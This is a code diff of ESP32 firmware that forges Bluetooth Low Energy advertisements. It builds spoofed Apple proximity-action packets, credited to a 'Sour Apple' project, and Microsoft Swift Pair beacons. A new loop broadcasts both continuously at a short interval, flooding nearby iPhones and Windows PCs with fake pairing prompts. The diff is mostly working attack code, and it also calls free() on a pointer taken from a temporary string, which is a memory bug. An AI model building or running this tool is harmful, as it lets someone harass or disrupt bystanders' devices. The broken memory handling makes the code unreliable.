@@ -41,30 +41,39 @@ public:
 
 	void advertiseApple()
 	{
-		for (int i = 0; i < 10; i++)
-		{
-			NimBLEAdvertisementData advData = getOAdvertisementData();
+		NimBLEAdvertisementData advData = getOAdvertisementData();
 
-			adv->setAdvertisementData(advData);
+		adv->setAdvertisementData(advData);
+		adv->setMinInterval(0x20);
+		adv->setMaxInterval(0x20);
+		adv->setMinPreferred(0x20);
+		adv->setMaxPreferred(0x20);
 
-			adv->start();
-			led.flash();
-			adv->stop();
-			delay(100);
-		}
+		adv->start();
+		led.flash();
+		delay(100);
+		adv->stop();
 	}
 
 	void advertiseWindows()
 	{
-		for (int i = 0; i < 10; i++)
-		{
-			NimBLEAdvertisementData advData = getSwiftAdvertisementData();
+		NimBLEAdvertisementData advData = getSwiftAdvertisementData();
 
-			adv->setAdvertisementData(advData);
-			adv->start();
-			led.flash();
-			delay(100);
-			adv->stop();
+		adv->setAdvertisementData(advData);
+		adv->start();
+		led.flash();
+		delay(100);
+		adv->stop();
+	}
+
+	void toggleAdvertiseEveryone() {
+		advertiseEveryone = !advertiseEveryone;
+	}
+
+	void loop() {
+		if (advertiseEveryone) {
+			advertiseApple();
+			advertiseWindows();
 		}
 	}
 
@@ -73,6 +82,7 @@ private:
 	// BLEAdvertising* Adv;
 	NimBLEAdvertising *adv;
 	NimBLEServer *server;
+	bool advertiseEveryone = false;
 
 	String generateRandomString(int length)
 	{
@@ -89,9 +99,11 @@ private:
 		return randomString;
 	}
 
-	NimBLEAdvertisementData getOAdvertisementData()
-	{
-		NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
+	/**
+	 * Credits https://github.com/RapierXbox/ESP32-Sour-Apple
+	 */
+	NimBLEAdvertisementData getOAdvertisementData() {
+		NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
 		uint8_t packet[17];
 		uint8_t i = 0;
 
@@ -111,14 +123,15 @@ private:
 		packet[i++] = 0x10; // Type ???
 		esp_fill_random(&packet[i], 3);
 
-		randomAdvertisementData.addData(std::string((char *)packet, 17));
-		return randomAdvertisementData;
+		oAdvertisementData.addData(std::string((char *)packet, 17));
+		return oAdvertisementData;
 	}
 
-	NimBLEAdvertisementData getSwiftAdvertisementData()
-	{
-		NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
-		const char *display_name = generateRandomString(10).c_str();
+	NimBLEAdvertisementData getSwiftAdvertisementData() {
+		NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
+		const char* prefix = "FS | ";
+		String randomString = generateRandomString(10);
+		const char* display_name = (String(prefix) + randomString).c_str();
 		uint8_t display_name_len = strlen(display_name);
 
 		uint8_t size = 7 + display_name_len;
@@ -138,70 +151,12 @@ private:
 		}
 		i += display_name_len;
 
-		randomAdvertisementData.addData(std::string((char *)packet, size));
+		oAdvertisementData.addData(std::string((char *)packet, size));
 
 		free(packet);
 
 		free((void *)display_name);
 
-		return randomAdvertisementData;
+		return oAdvertisementData;
 	}
-
-	/*
-	BLEAdvertisementData getOAdvertisementData() {
-		BLEAdvertisementData randomAdvertisementData = BLEAdvertisementData();
-		uint8_t packet[17];
-		uint8_t size = 17;
-		uint8_t i = 0;
-
-		packet[i++] = size - 1; // Packet Length
-		packet[i++] = 0xFF;     // Packet Type (Manufacturer Specific)
-		packet[i++] = 0x4C;     // Packet Company ID (Apple, Inc.)
-		packet[i++] = 0x00;     // ...
-		packet[i++] = 0x0F;     // Type
-		packet[i++] = 0x05;     // Length
-		packet[i++] = 0xC1;     // Action Flags
-		const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
-		packet[i++] = types[rand() % sizeof(types)]; // Action Type
-		esp_fill_random(&packet[i], 3); // Authentication Tag
-		i += 3;
-		packet[i++] = 0x00;  // ???
-		packet[i++] = 0x00;  // ???
-		packet[i++] = 0x10;  // Type ???
-		esp_fill_random(&packet[i], 3);
-
-		randomAdvertisementData.addData(std::string((char*)packet, 17));
-		return randomAdvertisementData;
-	}
-
-	BLEAdvertisementData getSwiftAdvertisementData() {
-		BLEAdvertisementData randomAdvertisementData = BLEAdvertisementData();
-		const char* display_name = generateRandomString(10).c_str();
-		uint8_t display_name_len = strlen(display_name);
-
-		uint8_t size = 7 + display_name_len;
-		uint8_t* packet = (uint8_t*)malloc(size);
-		uint8_t i = 0;
-
-		packet[i++] = size - 1; // Size
-		packet[i++] = 0xFF;     // AD Type (Manufacturer Specific)
-		packet[i++] = 0x06;     // Company ID (Microsoft)
-		packet[i++] = 0x00;     // ...
-		packet[i++] = 0x03;     // Microsoft Beacon ID
-		packet[i++] = 0x00;     // Microsoft Beacon Sub Scenario
-		packet[i++] = 0x80;     // Reserved RSSI Byte
-		for (int j = 0; j < display_name_len; j++) {
-			packet[i + j] = display_name[j];
-		}
-		i += display_name_len;
-
-		randomAdvertisementData.addData(std::string((char*)packet, size));
-
-		free(packet);
-
-		free((void*)display_name);
-
-		return randomAdvertisementData;
-	}
-	*/
 };
